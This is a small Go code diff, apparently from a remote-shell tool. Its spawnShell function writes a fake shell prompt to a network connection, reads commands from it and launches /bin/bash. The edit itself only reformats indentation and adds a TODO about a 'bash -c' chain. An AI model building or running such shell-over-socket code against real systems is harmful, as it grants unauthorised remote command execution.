@@ -36,14 +36,14 @@ func spawnShell(conn net.Conn)
 	for
 	{
 		prompt := fmt.Sprintf("%s@%s:%s$ ", username, hostname, getUpdatedDirectory())
-        conn.Write([]byte(prompt))
-
+		conn.Write([]byte(prompt))
+		// TODO: Finish execution using bash -c chain
 		input := make([]byte, 1024)
-        _, err := conn.Read(input)
-        if handleError(err) == 1 {
-            fmt.Printf("❌ Error reading input from client: %v\n", err)
-            return
-        }
+		_, err := conn.Read(input)
+		if handleError(err) == 1 {
+			fmt.Printf("❌ Error reading input from client: %v\n", err)
+			return
+		}
 	}
 
 	spawn := exec.Command("/bin/bash")
